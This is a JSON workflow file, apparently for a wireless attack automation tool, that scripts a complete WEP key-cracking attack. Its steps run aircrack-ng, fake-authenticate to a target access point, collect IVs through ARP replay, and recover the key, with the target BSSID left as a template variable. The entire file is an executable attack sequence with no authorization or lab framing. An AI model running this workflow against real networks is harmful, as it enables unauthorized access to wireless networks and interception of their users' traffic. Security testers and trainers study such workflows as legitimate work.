{
    "name": "wep_full_crack",
    "description": "Full WEP cracking workflow: fake auth, ARP replay IV collection, and aircrack-ng key recovery",
    "author": "JAMES",
    "version": "1.0",
    "category": "wifi",
    "tags": ["wep", "crack", "aircrack", "iv", "wireless"],
    "requires": ["aircrack-ng", "aireplay-ng"],
    "variables": {
        "interface": "monitor-mode interface (e.g. wlan0mon)",
        "bssid": "target AP BSSID"
    },
    "steps": [
        {
            "tool": "aircrack",
            "action": "check_kill",
            "description": "Kill interfering processes"
        },
        {
            "tool": "aircrack",
            "action": "fake_auth",
            "params": {"interface": "{{interface}}", "bssid": "{{bssid}}"},
            "description": "Associate with target AP"
        },
        {
            "tool": "aircrack",
            "action": "start_airodump",
            "params": {"interface": "{{interface}}", "bssid": "{{bssid}}", "write_prefix": "/tmp/wep_capture"},
            "description": "Start capturing IVs",
            "background": true
        },
        {
            "tool": "aircrack",
            "action": "arp_replay",
            "params": {"interface": "{{interface}}", "bssid": "{{bssid}}", "timeout": 120},
            "description": "ARP replay to generate IVs"
        },
        {
            "tool": "aircrack",
            "action": "crack_wep",
            "params": {"capture_file": "/tmp/wep_capture-01.cap", "bssid": "{{bssid}}"},
            "description": "Crack WEP key from collected IVs"
        }
    ]
}
